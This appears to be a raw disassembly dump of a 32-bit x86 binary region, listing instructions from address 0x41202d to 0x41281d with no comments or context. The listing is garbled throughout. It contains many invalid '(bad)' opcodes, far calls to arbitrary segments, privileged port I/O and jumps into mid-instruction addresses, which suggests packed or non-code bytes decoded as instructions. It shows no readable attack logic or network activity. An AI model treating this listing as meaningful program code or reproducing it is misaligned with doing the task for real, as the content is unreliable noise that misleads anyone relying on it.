  41202d:	push   ss
  41202e:	adc    al,0xdc
  412030:	sub    DWORD PTR [edi+0x1f],edi
  412033:	push   ebp
  412034:	hlt    
  412035:	mov    ah,0xef
  412037:	mov    edi,0x3d40d411
  41203c:	call   0x9454:0x2a6b1bda
  412043:	mov    dl,0x78
  412045:	push   ss
  412046:	or     BYTE PTR [eax],0xe8
  412049:	pop    ecx
  41204a:	sar    DWORD PTR [esi+0x2b],1
  41204d:	cs lock xchg esi,eax
  412050:	mov    ebx,0x113071b5
  412055:	add    ebx,esi
  412057:	js     0x4120d3
  412059:	pop    ds
  41205a:	ja     0x41204b
  41205c:	dec    edi
  41205d:	and    bl,ch
  41205f:	add    eax,0xd9d8d24e
  412064:	(bad)  
  412065:	or     BYTE PTR [eax+esi*2-0x3e],ah
  412069:	add    al,0x52
  41206b:	cmp    al,ch
  41206d:	pop    edx
  41206e:	ret    
  41206f:	test   ah,al
  412071:	ret    
  412072:	adc    ch,BYTE PTR [ebx-0x27]
  412075:	mov    ch,0x3f
  412077:	das    
  412078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412079:	out    dx,eax
  41207a:	sbb    BYTE PTR [ebp+edx*4-0x4f9be91b],dh
  412081:	cs pop ebp
  412083:	mov    esp,0xb9319ff0
  412088:	adc    eax,0x7defecad
  41208d:	fsubrp st(5),st
  41208f:	inc    esp
  412090:	mov    eax,0x4020a91c
  412095:	retf   0xea8d
  412098:	mov    BYTE PTR [ecx+0x57],cl
  41209b:	fistp  DWORD PTR [esi-0x64d371fd]
  4120a1:	dec    ecx
  4120a2:	pop    ss
  4120a3:	call   0xe84d:0xd08b99bb
  4120aa:	or     eax,0x5947a959
  4120af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120b0:	push   ebx
  4120b1:	std    
  4120b2:	gs xchg ecx,eax
  4120b4:	dec    edi
  4120b5:	add    al,0xf5
  4120b7:	sbb    al,BYTE PTR ds:0x2ff09bdf
  4120bd:	sahf   
  4120be:	cmp    al,BYTE PTR [esp+eiz*2-0x4c]
  4120c2:	sbb    bl,BYTE PTR [esi+0x3b2a092]
  4120c8:	call   0xfd04c419
  4120cd:	and    eax,0xd22b4ee0
  4120d2:	adc    eax,0x629d8c3b
  4120d7:	xchg   ecx,eax
  4120d8:	sbb    ch,cl
  4120da:	aas    
  4120db:	push   0x52
  4120dd:	mov    bh,0x77
  4120df:	retf   
  4120e0:	xchg   ebx,eax
  4120e1:	in     eax,0x17
  4120e3:	rcl    DWORD PTR [ebp+0x6af999d6],0x21
  4120ea:	jp     0x412138
  4120ec:	fbstp  TBYTE PTR [edi+0x2a73faf4]
  4120f2:	xor    DWORD PTR [esi-0x2],edx
  4120f5:	cmp    eax,0x67030b24
  4120fa:	dec    esi
  4120fb:	mov    dl,0xcb
  4120fd:	sub    dl,BYTE PTR [ebx]
  4120ff:	xor    al,BYTE PTR [edi+esi*8-0x6b926ec1]
  412106:	xor    BYTE PTR [ecx-0x45],0xa9
  41210a:	pop    edi
  41210b:	mov    esi,0xe54b1183
  412110:	(bad)  
  412111:	loop   0x412164
  412113:	in     eax,0x4e
  412115:	adc    ah,BYTE PTR [ebx+ecx*8-0x7b]
  412119:	push   0x16
  41211b:	push   ebx
  41211c:	dec    DWORD PTR [ecx]
  41211e:	in     al,0x44
  412120:	adc    edx,ecx
  412122:	push   ds
  412123:	fsubr  QWORD PTR [edi+0x11df1bdd]
  412129:	mov    dh,0x9d
  41212b:	gs iret 
  41212d:	jecxz  0x41213a
  41212f:	mov    ecx,0xcfaef55f
  412134:	sahf   
  412135:	sub    al,0x9e
  412137:	push   esi
  412138:	add    cl,ch
  41213a:	pop    ds
  41213b:	push   es
  41213c:	retf   0x5cf
  41213f:	xchg   ecx,eax
  412140:	xchg   edi,eax
  412141:	(bad)  
  412142:	pusha  
  412143:	bound  esp,QWORD PTR [esi+0x2f681cf9]
  412149:	inc    eax
  41214a:	mov    DWORD PTR [ebx-0x71],ebp
  41214d:	test   BYTE PTR [ebx],bh
  41214f:	sbb    edi,DWORD PTR [eax-0x79]
  412152:	adc    al,0xae
  412154:	in     eax,0xd4
  412156:	mov    bh,0x53
  412158:	in     eax,0x4b
  41215a:	loop   0x4120e0
  41215c:	mov    al,0x99
  41215e:	sbb    edx,esp
  412160:	adc    DWORD PTR [edx],edi
  412162:	pop    esi
  412163:	fisubr WORD PTR [ebx]
  412165:	pop    edx
  412166:	hlt    
  412167:	cmp    DWORD PTR [ebx],edi
  412169:	lods   eax,DWORD PTR ds:[esi]
  41216a:	inc    esi
  41216b:	clc    
  41216c:	daa    
  41216d:	xchg   ecx,eax
  41216e:	pop    eax
  41216f:	test   DWORD PTR [esi+0x2c3e5b5b],esp
  412175:	cwde   
  412176:	mov    esp,ecx
  412178:	hlt    
  412179:	sti    
  41217a:	and    eax,0xc625dac8
  41217f:	xor    dl,BYTE PTR [edx+eiz*8]
  412182:	imul   edi,esp,0x3d
  412185:	adc    DWORD PTR [ebx+0x7a],edx
  412188:	fisubr DWORD PTR ds:0x3fe9650e
  41218e:	ret    
  41218f:	pop    esi
  412190:	cmp    bl,BYTE PTR [edi]
  412192:	(bad)  
  412193:	imul   ecx,DWORD PTR [esi+0x24],0x473c8bce
  41219a:	sub    ebx,DWORD PTR [eax-0x19]
  41219d:	into   
  41219e:	fld    TBYTE PTR [eax-0x1210e025]
  4121a4:	pop    ebp
  4121a5:	leave  
  4121a6:	mov    ebx,0x15e8b1e8
  4121ab:	mov    BYTE PTR [esp+eiz*4],dl
  4121ae:	shl    BYTE PTR [ecx+0x4c],0xfe
  4121b2:	jae    0x41220d
  4121b4:	xchg   esp,eax
  4121b5:	stc    
  4121b6:	mov    bh,ch
  4121b8:	pop    esi
  4121b9:	xchg   esp,eax
  4121ba:	aad    0x55
  4121bc:	mov    DWORD PTR [eax],edi
  4121be:	rcr    DWORD PTR [eax+ecx*1+0x49],0xbc
  4121c3:	mov    ebp,0xbfca1182
  4121c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121c9:	pop    ds
  4121ca:	xchg   ecx,ecx
  4121cc:	fdivr  DWORD PTR ds:0x7deb4a34
  4121d2:	xor    ecx,edi
  4121d4:	mov    edx,0x64f27df8
  4121d9:	aaa    
  4121da:	int    0xa4
  4121dc:	(bad)  
  4121dd:	jg     0x4121d7
  4121df:	sub    al,0x3a
  4121e1:	cmp    eax,0xee26bb1
  4121e6:	call   0x9700:0xe69e8682
  4121ed:	push   ds
  4121ee:	add    al,0x88
  4121f0:	ins    BYTE PTR es:[edi],dx
  4121f1:	fwait
  4121f2:	(bad)  
  4121f3:	leave  
  4121f4:	add    BYTE PTR ss:[edi],dl
  4121f7:	sbb    BYTE PTR [edi+0x16],0x9
  4121fb:	fcom   QWORD PTR [edx-0x7b]
  4121fe:	xchg   esi,eax
  4121ff:	xchg   BYTE PTR [eax-0x7bdadaa1],ah
  412205:	adc    al,0xae
  412208:	sbb    DWORD PTR [edi],esi
  41220a:	lods   eax,DWORD PTR ds:[esi]
  41220b:	stc    
  41220c:	bound  ebp,QWORD PTR [edi+0x3d02bcb8]
  412212:	push   esp
  412213:	sub    eax,0x2fff97a4
  412218:	imul   esp,DWORD PTR [edi-0x7c],0x65
  41221c:	repnz rcr BYTE PTR [eax+0x1623486d],1
  412223:	fwait
  412224:	push   ebp
  412225:	and    dl,BYTE PTR [edx+0x26bbe086]
  41222b:	sbb    ch,cl
  41222d:	imul   ebx,eax,0xffffffae
  412230:	(bad)  [edi+eiz*4+0x20386e6b]
  412237:	xchg   esp,eax
  412238:	dec    eax
  412239:	fwait
  41223a:	push   ss
  41223b:	pop    es
  41223c:	es ja  0x412250
  41223f:	dec    esp
  412240:	mov    esp,0x1f5a1d5
  412245:	(bad)  
  412247:	repnz call 0x2eb5:0x707c9c77
  41224f:	outs   dx,BYTE PTR ds:[esi]
  412250:	push   eax
  412251:	mov    cl,0x2f
  412253:	mov    ebp,0x36b92dc5
  412258:	daa    
  412259:	ret    
  41225a:	frstor [edx-0x16]
  41225d:	sub    ch,BYTE PTR [ecx]
  41225f:	push   ecx
  412260:	xchg   edi,eax
  412261:	jno    0x412253
  412263:	sub    ch,bh
  412265:	jno    0x412247
  412267:	adc    al,0xf
  412269:	dec    eax
  41226a:	pusha  
  41226b:	sub    al,0x96
  41226d:	push   esp
  41226e:	jl     0x41227a
  412270:	add    ebp,DWORD PTR [edx+0x63]
  412273:	clc    
  412274:	aam    0x2a
  412276:	data16 into 
  412278:	daa    
  412279:	push   ds
  41227a:	adc    BYTE PTR [esi-0x5ec5a0e7],0xf3
  412281:	mov    gs,WORD PTR [esi+0x4fcbbe6d]
  412287:	mov    ds:0x7bdb7290,al
  41228c:	popa   
  41228d:	add    eax,0xc3ac4065
  412292:	xor    al,0x2e
  412294:	jl     0x4122d0
  412296:	jle    0x41222e
  412298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412299:	jae    0x4122d3
  41229b:	jnp    0x4122b0
  41229d:	in     al,0xa2
  41229f:	les    edi,FWORD PTR [ebx+edi*2-0xa678549]
  4122a6:	mov    ?,ecx
  4122a8:	out    dx,eax
  4122a9:	sub    BYTE PTR [ebp-0x6c60d437],bl
  4122af:	cli    
  4122b0:	fbld   TBYTE PTR [ecx-0x41]
  4122b3:	cli    
  4122b4:	fs loopne 0x412291
  4122b7:	xchg   esp,eax
  4122b8:	sahf   
  4122b9:	jp     0x4122b1
  4122bb:	pop    esi
  4122bc:	and    DWORD PTR [edi+0x4a81a30],0x95ea368c
  4122c6:	add    al,0xab
  4122c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122c9:	and    DWORD PTR [ecx+0x44],0xffffffa8
  4122cd:	mov    BYTE PTR [edi+0x22a649f9],al
  4122d3:	push   eax
  4122d4:	(bad)  
  4122d5:	fild   DWORD PTR [esi]
  4122d7:	inc    eax
  4122d8:	xor    DWORD PTR [ecx+0x3184d9e5],eax
  4122de:	xchg   edx,eax
  4122df:	outs   dx,BYTE PTR ds:[esi]
  4122e0:	sbb    DWORD PTR [ecx+edx*4],edi
  4122e3:	repnz push es
  4122e5:	iret   
  4122e6:	(bad)  
  4122e7:	jns    0x412332
  4122e9:	sub    DWORD PTR [ebp+esi*1+0x1],eax
  4122ed:	out    dx,al
  4122ee:	sub    BYTE PTR [ecx+ebp*1-0xb],dl
  4122f2:	nop
  4122f3:	cwde   
  4122f4:	(bad)  
  4122f5:	lahf   
  4122f6:	clc    
  4122f7:	ins    DWORD PTR es:[edi],dx
  4122f8:	add    ch,BYTE PTR [edi]
  4122fa:	ror    DWORD PTR [esi],0x37
  4122fd:	mov    esi,DWORD PTR [ebp-0x1c]
  412300:	inc    ecx
  412301:	fdivr  QWORD PTR [ecx+0x6e]
  412304:	daa    
  412305:	xchg   edi,eax
  412306:	loopne 0x4122bf
  412308:	mov    edi,0x8547d6af
  41230d:	clc    
  41230e:	mov    BYTE PTR [esi-0x5a24de04],ch
  412314:	or     al,0x4f
  412316:	loop   0x4122fe
  412318:	das    
  412319:	dec    eax
  41231a:	repz retf 
  41231c:	out    0xa7,al
  41231e:	dec    ebx
  41231f:	fldenv [edi-0x18]
  412322:	sub    BYTE PTR [edx+0x17e0fe27],cl
  412328:	in     al,0x53
  41232a:	stc    
  41232b:	mov    BYTE PTR [esi-0x78],cl
  41232e:	inc    ebp
  41232f:	inc    esi
  412330:	mov    ch,0x38
  412332:	enter  0x589e,0x7d
  412336:	jmp    0x65e1e13d
  41233b:	mov    bh,BYTE PTR [ecx+0x6d961a94]
  412341:	jnp    0x4122e7
  412343:	aaa    
  412344:	and    BYTE PTR [eax+0x44],al
  412347:	dec    ebp
  412348:	cli    
  412349:	cs jae 0x4122da
  41234c:	call   0x78e5:0x5956675c
  412353:	test   BYTE PTR [eax+0x4cf58a67],ah
  412359:	std    
  41235a:	stc    
  41235b:	mov    esi,0xac01f900
  412360:	mov    al,ds:0x6ab7bdf0
  412365:	out    0x98,al
  412367:	xor    al,0xae
  412369:	hlt    
  41236a:	cs cli 
  41236c:	push   ss
  41236d:	and    al,BYTE PTR [edx+0x26e84cf6]
  412373:	stos   BYTE PTR es:[edi],al
  412374:	xor    DWORD PTR ds:0x68f70760,esp
  41237a:	(bad)  fs:[ebx]
  41237d:	or     al,0x52
  41237f:	dec    esi
  412381:	stos   DWORD PTR es:[edi],eax
  412382:	jge    0x4123b8
  412384:	repz pop eax
  412386:	mov    ebx,0x72013bf5
  41238b:	mov    eax,ds:0x88b52094
  412390:	mov    dh,0x73
  412392:	lock stc 
  412394:	mov    esp,0x706e50e9
  412399:	idiv   dl
  41239b:	dec    ebx
  41239c:	jmp    esp
  41239e:	adc    al,0x90
  4123a0:	push   edi
  4123a1:	push   edx
  4123a2:	test   BYTE PTR [ebp-0x54],al
  4123a5:	fxch   st(2)
  4123a7:	cmp    bl,BYTE PTR [ebp+0x27180773]
  4123ad:	sub    al,0x71
  4123af:	inc    eax
  4123b0:	push   esi
  4123b1:	jo     0x412394
  4123b3:	fidiv  DWORD PTR [eax-0x4a]
  4123b6:	xor    BYTE PTR [eax],bl
  4123b8:	adc    eax,0xc5b8222d
  4123bd:	adc    eax,0xab8b50ce
  4123c2:	cwde   
  4123c3:	xchg   edx,eax
  4123c4:	adc    eax,0xe80b6222
  4123c9:	loopne 0x4123f8
  4123cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123cc:	ins    BYTE PTR es:[edi],dx
  4123cd:	aam    0xb
  4123cf:	bound  esi,QWORD PTR [ecx-0x35]
  4123d2:	lods   al,BYTE PTR ds:[esi]
  4123d3:	dec    ebx
  4123d4:	in     al,dx
  4123d5:	xchg   ecx,eax
  4123d6:	xor    bl,BYTE PTR [esi-0x8]
  4123d9:	repnz or ah,bl
  4123dc:	imul   eax,edx,0x1
  4123df:	sub    ebp,ebp
  4123e1:	fs cs mov eax,0x1a2521a6
  4123e8:	les    edx,FWORD PTR [ebp+ebx*1+0x40]
  4123ec:	add    DWORD PTR es:[esi-0x2b6a3119],0xffffff8a
  4123f4:	daa    
  4123f5:	pop    ebp
  4123f6:	adc    BYTE PTR [edx+ecx*4-0x21],al
  4123fa:	cdq    
  4123fb:	in     al,0x2f
  4123fd:	jmp    0xd56efea7
  412402:	xor    al,0x6b
  412404:	out    0xe9,al
  412406:	mov    DWORD PTR [ecx+0x7da55908],edi
  41240c:	iret   
  41240d:	xor    al,0xd4
  41240f:	sbb    DWORD PTR [eax-0x65],ecx
  412412:	or     DWORD PTR [ecx-0x10f6ff28],eax
  412418:	in     al,0xb2
  41241a:	int    0xab
  41241c:	test   DWORD PTR [edx-0x773e1750],eax
  412422:	cmc    
  412423:	or     BYTE PTR [edx-0x68],bl
  412426:	mov    edi,edx
  412428:	or     eax,0xe5bd0391
  41242d:	fsubr  QWORD PTR [ecx+0x24]
  412430:	(bad)  
  412431:	ficomp DWORD PTR [ebp-0xdcd76e9]
  412437:	inc    ebp
  412438:	add    BYTE PTR [ebx],cl
  41243a:	and    dh,dl
  41243c:	imul   ecx,DWORD PTR [edi],0xffffff86
  41243f:	lds    ebx,FWORD PTR [ecx]
  412441:	add    ebx,ecx
  412443:	test   eax,0xc619b122
  412448:	add    BYTE PTR [ecx],ch
  41244a:	das    
  41244b:	xor    eax,DWORD PTR [eax+0xc]
  41244e:	inc    esp
  41244f:	ins    BYTE PTR es:[edi],dx
  412450:	mov    eax,ds:0x68e3004c
  412455:	mov    DWORD PTR [edx],esp
  412457:	(bad)  
  412458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412459:	mov    edx,0xb2884a89
  41245e:	pushf  
  41245f:	outs   dx,DWORD PTR ds:[esi]
  412460:	jge    0x4123ea
  412462:	fmul   DWORD PTR [ebx]
  412464:	fild   WORD PTR [edx]
  412466:	sub    DWORD PTR [esi-0x59e4bba0],edx
  41246c:	sub    al,0xb9
  41246e:	xlat   BYTE PTR ds:[ebx]
  41246f:	call   0xe26f7aef
  412474:	ss sbb eax,0x8bea6cce
  41247a:	push   esi
  41247b:	adc    BYTE PTR [esi-0x4a6ad6dc],bl
  412481:	call   0xad93:0xb57ba6c1
  412488:	inc    esi
  412489:	(bad)  
  41248a:	mov    DWORD PTR [edx+0x52885f2d],esp
  412490:	inc    edx
  412491:	lea    ebx,ds:0x383f90a0
  412497:	add    esi,esi
  412499:	hlt    
  41249a:	retf   0x3ff6
  41249d:	xor    al,0xad
  41249f:	xchg   ebp,eax
  4124a0:	pop    esp
  4124a1:	or     edi,ebp
  4124a3:	cmp    ch,BYTE PTR [eax]
  4124a5:	mov    ds:0x68579917,al
  4124aa:	cmp    DWORD PTR [esi+eax*1+0x47],edi
  4124ae:	adc    ch,bl
  4124b0:	jmp    0x76d0bf35
  4124b5:	adc    eax,0x6540cd32
  4124ba:	sub    eax,0x37d04613
  4124bf:	stos   DWORD PTR es:[edi],eax
  4124c0:	push   cs
  4124c1:	es cli 
  4124c3:	dec    ecx
  4124c4:	sti    
  4124c5:	push   0x65683787
  4124ca:	push   esi
  4124cb:	sub    eax,0x1316552c
  4124d0:	add    eax,edx
  4124d2:	push   cs
  4124d3:	aam    0x5
  4124d5:	(bad)  
  4124d7:	add    al,0xd6
  4124d9:	nop
  4124da:	scas   al,BYTE PTR es:[edi]
  4124db:	cli    
  4124dc:	daa    
  4124dd:	push   ebx
  4124de:	cs ret 
  4124e0:	pop    es
  4124e1:	pop    esp
  4124e2:	stc    
  4124e3:	jmp    0x412505
  4124e5:	push   eax
  4124e6:	mov    bh,0xeb
  4124e8:	xor    al,0x53
  4124ea:	mov    ebp,0x5d0ae102
  4124ef:	pop    edi
  4124f0:	shl    BYTE PTR [esi+0x55dd6179],0x42
  4124f7:	daa    
  4124f8:	jb     0x412549
  4124fa:	std    
  4124fb:	aad    0x80
  4124fd:	retfw  0xf28a
  412501:	(bad)  
  412502:	mov    ch,0x1f
  412504:	call   0x10161d32
  412509:	xchg   DWORD PTR [ebx-0x52],esi
  41250c:	push   ebp
  41250d:	jp     0x41249b
  41250f:	or     DWORD PTR [eax+edx*1],ebx
  412512:	mov    eax,ds:0x3559f61e
  412517:	and    eax,0xdd7ff516
  41251c:	shl    BYTE PTR [edi-0x41],cl
  41251f:	jb     0x412518
  412521:	cs xchg edi,eax
  412523:	mov    ah,0x41
  412525:	mov    edx,0x466f4d2d
  41252a:	xor    DWORD PTR [esi+0x49],eax
  41252d:	fisubr DWORD PTR [eax]
  41252f:	xor    ch,BYTE PTR [ecx+esi*1]
  412532:	inc    ecx
  412533:	gs sbb al,0x96
  412536:	dec    edi
  412537:	clc    
  412538:	(bad)  
  412539:	jb     0x4124e4
  41253b:	ds dec esp
  41253d:	mov    dl,0x12
  41253f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412540:	sub    DWORD PTR [edx+eiz*8],edx
  412543:	imul   DWORD PTR [esi]
  412545:	adc    al,0x82
  412547:	shl    DWORD PTR [ebp-0x3b6f0071],cl
  41254d:	xchg   ebp,eax
  41254e:	mov    ds:0x838f2797,al
  412553:	sub    bl,BYTE PTR [ebx]
  412555:	sub    BYTE PTR [eax],0x6
  412558:	out    0xd1,al
  41255a:	arpl   WORD PTR [esi+0x19],sp
  41255d:	mov    bh,0x24
  41255f:	jno    0x41251e
  412561:	aas    
  412562:	test   BYTE PTR [ecx],dl
  412564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412565:	push   ss
  412566:	jg     0x4125a2
  412568:	adc    BYTE PTR [ecx],cl
  41256a:	enter  0xc784,0xa8
  41256e:	cld    
  41256f:	mov    DWORD PTR [esi+0x23f6fecf],edi
  412575:	mov    ebp,0x326d52c3
  41257a:	ss adc esi,ebx
  41257d:	fs repnz xor al,0x12
  412581:	mov    DWORD PTR [ebx-0x1f],0x89c27f13
  412588:	fwait
  412589:	stos   BYTE PTR es:[edi],al
  41258a:	xor    DWORD PTR [ebx+edx*4+0x6cda8356],ebx
  412591:	xchg   BYTE PTR [ebx+0x67],dl
  412594:	jb     0x41258a
  412596:	loope  0x4125e5
  412598:	xchg   ebx,eax
  412599:	inc    ecx
  41259a:	mov    BYTE PTR [esi+0x22],dl
  41259d:	inc    ebp
  41259e:	sub    al,0xf3
  4125a0:	call   0x15d2:0xf3969011
  4125a7:	add    BYTE PTR ds:0x6e65b57f,dh
  4125ad:	push   0x11
  4125af:	rcr    DWORD PTR [ebp-0x44e1783b],cl
  4125b5:	push   eax
  4125b6:	(bad)  [edi+0x65]
  4125b9:	pop    es
  4125ba:	sub    cl,BYTE PTR [ecx-0x5d]
  4125bd:	xchg   ecx,eax
  4125be:	sti    
  4125bf:	lods   al,BYTE PTR ds:[esi]
  4125c0:	adc    ecx,DWORD PTR [edx-0x4a]
  4125c3:	inc    esi
  4125c4:	pop    ss
  4125c5:	jno    0x41258b
  4125c7:	adc    al,0x69
  4125c9:	das    
  4125ca:	stos   DWORD PTR es:[edi],eax
  4125cb:	pop    eax
  4125cc:	call   0x3f72:0xb00a7bc7
  4125d3:	mov    al,ds:0x8fe4ac4b
  4125d8:	add    eax,0x61d491cc
  4125dd:	out    0x7a,al
  4125df:	jmp    0x412603
  4125e1:	data16 sbb BYTE PTR [ebx+ebp*4-0x10],0x3
  4125e7:	mov    ch,0xf2
  4125e9:	ss (bad) 
  4125eb:	cmp    DWORD PTR [edx],ebp
  4125ed:	ins    BYTE PTR es:[edi],dx
  4125ee:	(bad)  
  4125ef:	and    eax,0xecae9815
  4125f4:	xchg   edi,ebx
  4125f6:	mov    edx,0x6a4eb84a
  4125fb:	push   es
  4125fc:	mov    ds:0x5b8d19a7,al
  412601:	pop    esi
  412602:	add    cl,BYTE PTR [ebp+0x51]
  412605:	lahf   
  412606:	jmp    0x412644
  412608:	adc    al,0x66
  41260a:	jle    0x4125e4
  41260c:	(bad)  
  41260d:	fdiv   QWORD PTR ss:[ebx]
  412610:	sbb    esi,DWORD PTR [ebx-0x1b41164f]
  412616:	xchg   ebx,eax
  412617:	ss sbb al,0x7b
  41261a:	sub    al,0x34
  41261c:	lds    ebx,FWORD PTR [ecx]
  41261e:	mov    dl,0x4e
  412620:	inc    edi
  412621:	jmp    DWORD PTR [eax-0x1818f327]
  412627:	jg     0x4125bd
  412629:	mov    BYTE PTR [edi-0x734496bc],bl
  41262f:	cmp    eax,0xdff95466
  412634:	je     0x4126a9
  412636:	sbb    al,0x74
  412638:	mov    esi,DWORD PTR [eax-0x36]
  41263b:	mov    al,0xc5
  41263d:	mov    DWORD PTR ds:0xefed06e8,eax
  412643:	push   esi
  412644:	fisubr DWORD PTR ds:0x536323da
  41264a:	cmp    DWORD PTR [eax+0x29],edi
  41264d:	xchg   esp,eax
  41264e:	(bad)  
  412650:	push   ss
  412651:	mov    ebx,0x8fd3fcba
  412656:	fld    TBYTE PTR [esi-0x3b]
  412659:	mov    ch,0x44
  41265b:	adc    eax,esp
  41265d:	cmp    edi,eax
  41265f:	enter  0x3ba1,0x40
  412663:	stos   BYTE PTR es:[edi],al
  412664:	mov    ebp,0xf5560a7c
  412669:	pop    ecx
  41266a:	sti    
  41266b:	test   ecx,0x6503dd2d
  412671:	dec    eax
  412672:	jg     0x4126ab
  412674:	sbb    al,0xc9
  412676:	int3   
  412677:	retw   0xc433
  41267b:	outs   dx,DWORD PTR ds:[esi]
  41267c:	popf   
  41267d:	inc    ebx
  41267e:	inc    ebx
  41267f:	mov    ds:0xc17d2784,al
  412684:	popf   
  412685:	mov    ds:0xa4c98e72,eax
  41268a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41268b:	inc    esi
  41268c:	sbb    eax,0xbae99207
  412691:	push   ecx
  412692:	sbb    esi,DWORD PTR [esi]
  412694:	push   eax
  412695:	stc    
  412696:	not    ebp
  412698:	push   0xa46b1882
  41269d:	fisttp DWORD PTR [esi]
  41269f:	mov    BYTE PTR [edx+0x5e],al
  4126a2:	repnz out dx,eax
  4126a4:	dec    esp
  4126a5:	loop   0x41268f
  4126a7:	into   
  4126a8:	in     al,0xad
  4126aa:	int    0x37
  4126ac:	jne    0x4126c8
  4126ae:	inc    ebx
  4126af:	jno    0x4126d8
  4126b1:	mul    DWORD PTR ds:[ebp+0x2f93d351]
  4126b8:	push   ds
  4126b9:	sbb    eax,0xaa0c67fc
  4126be:	mov    bh,0x65
  4126c0:	mov    DWORD PTR ds:0xbfc602e3,ebx
  4126c6:	outs   dx,DWORD PTR ds:[esi]
  4126c7:	sbb    al,0x1b
  4126c9:	xor    ecx,DWORD PTR [ebp+ebx*1+0x1c]
  4126cd:	std    
  4126ce:	test   DWORD PTR [ebx-0x73],ebx
  4126d1:	jp     0x412720
  4126d3:	add    BYTE PTR [esi-0x4c],bh
  4126d6:	out    dx,al
  4126d7:	pop    eax
  4126d8:	and    edx,DWORD PTR [eax-0x3b]
  4126db:	jl     0x41271b
  4126dd:	ret    
  4126de:	rol    DWORD PTR [edx+0x39],0x46
  4126e2:	mov    ebx,0x1e571c7f
  4126e7:	inc    edx
  4126e8:	sub    eax,0xb5b865f2
  4126ed:	aaa    
  4126ee:	jmp    0x22bafd13
  4126f3:	sar    DWORD PTR [eax],1
  4126f5:	fistp  WORD PTR [edi]
  4126f7:	adc    ah,BYTE PTR [edi-0x18]
  4126fa:	lock sub dl,BYTE PTR [edx]
  4126fd:	fisub  DWORD PTR [ebp-0x77c1c681]
  412703:	jne    0x4126be
  412705:	jle    0x4126cf
  412707:	arpl   WORD PTR [ecx],sp
  412709:	jno    0x41268f
  41270b:	push   ebp
  41270c:	push   0x6d
  41270e:	jnp    0x412768
  412710:	in     al,dx
  412711:	into   
  412712:	fist   WORD PTR [ecx+0x4f]
  412715:	repz das 
  412717:	ins    DWORD PTR es:[edi],dx
  412718:	nop
  412719:	loopne 0x412711
  41271b:	rcr    BYTE PTR [esi-0x675b9b4a],cl
  412721:	xchg   BYTE PTR [ecx-0x55e0d0ea],dh
  412727:	or     dh,dl
  412729:	jg     0x41273b
  41272b:	push   ss
  41272c:	mov    edx,0x3ac58cf3
  412731:	dec    ebx
  412732:	push   ebp
  412733:	ja     0x412779
  412735:	adc    BYTE PTR [ebx],dl
  412737:	inc    ebp
  412738:	jb     0x4126bf
  41273a:	jl     0x4126d9
  41273c:	in     al,dx
  41273d:	jg     0x412710
  41273f:	jle    0x412765
  412741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412742:	cmp    al,bl
  412744:	mov    esp,0x552af1ce
  412749:	mov    WORD PTR ds:0xd6c8e9a6,ds
  41274f:	mov    WORD PTR [ecx-0x1f2ebe55],gs
  412755:	inc    ecx
  412756:	inc    ebx
  412757:	lea    ecx,[esi]
  412759:	xchg   edx,eax
  41275a:	pop    edi
  41275b:	cmp    esi,DWORD PTR [ebx+0x4ce06442]
  412761:	cmp    ebx,DWORD PTR [ecx]
  412763:	in     al,0x19
  412765:	out    dx,al
  412766:	dec    esp
  412767:	dec    ebp
  412768:	das    
  412769:	lock dec ebp
  41276b:	dec    esi
  41276c:	pop    edi
  41276d:	loope  0x412740
  41276f:	jg     0x4127bd
  412771:	xor    al,0x84
  412773:	mov    edi,ebx
  412775:	fwait
  412776:	rcr    DWORD PTR [eax+0x405c928],1
  41277c:	mul    DWORD PTR [ebp+0x0]
  41277f:	cli    
  412780:	jo     0x4127a3
  412782:	fs inc ecx
  412784:	push   eax
  412785:	inc    esi
  412786:	mov    eax,ds:0x6bf28ea4
  41278b:	sbb    eax,0x39d433fe
  412790:	xor    ecx,DWORD PTR [ebx]
  412792:	ins    DWORD PTR es:[edi],dx
  412793:	jle    0x41275d
  412795:	cmp    ebp,DWORD PTR [esi]
  412797:	scas   al,BYTE PTR es:[edi]
  412798:	lea    ebp,[esi+esi*4]
  41279b:	adc    BYTE PTR [ecx-0x665eea68],ah
  4127a1:	sti    
  4127a2:	lds    ecx,FWORD PTR [edi-0x35aa6c01]
  4127a8:	sar    ah,0xa3
  4127ab:	or     DWORD PTR [esi+0x2d],ecx
  4127ae:	inc    ecx
  4127af:	xor    ah,BYTE PTR [eax+0x4c71a465]
  4127b5:	je     0x4127dc
  4127b7:	pop    eax
  4127b8:	push   ds
  4127b9:	jmp    0xde9e:0x791528b9
  4127c0:	or     DWORD PTR [ecx+0x304d13d],edx
  4127c6:	xlat   BYTE PTR ds:[ebx]
  4127c7:	lea    esi,[edx-0x244c1f7e]
  4127cd:	js     0x412750
  4127cf:	aam    0x72
  4127d1:	je     0x412813
  4127d3:	add    al,0x86
  4127d5:	jae    0x412844
  4127d7:	shr    esi,cl
  4127d9:	stos   BYTE PTR es:[edi],al
  4127da:	aaa    
  4127db:	lds    edi,FWORD PTR [esi+0x5e98825a]
  4127e1:	(bad)  
  4127e2:	in     al,dx
  4127e3:	pop    ebx
  4127e4:	add    al,0xbb
  4127e6:	clc    
  4127e7:	(bad)  
  4127e8:	pushf  
  4127e9:	pop    ss
  4127ea:	mov    ecx,0x58834526
  4127ef:	lea    ecx,[ebx]
  4127f1:	inc    ebx
  4127f2:	leave  
  4127f3:	daa    
  4127f4:	pop    ss
  4127f5:	fcmove st,st(3)
  4127f7:	sub    esp,DWORD PTR [ecx+ebx*2-0x38]
  4127fb:	cmp    al,0xce
  4127fd:	push   0xffffffd5
  4127ff:	sbb    dl,bl
  412801:	popa   
  412802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412803:	adc    BYTE PTR [ebp+0x35b98897],ch
  412809:	sub    DWORD PTR [edx+0x65],ebp
  41280c:	std    
  41280d:	sar    BYTE PTR [ecx],1
  41280f:	push   0x7dde0424
  412814:	jno    0x412799
  412816:	adc    eax,0x262d670f
  41281b:	push   0x24
  41281d:	in     eax,dx
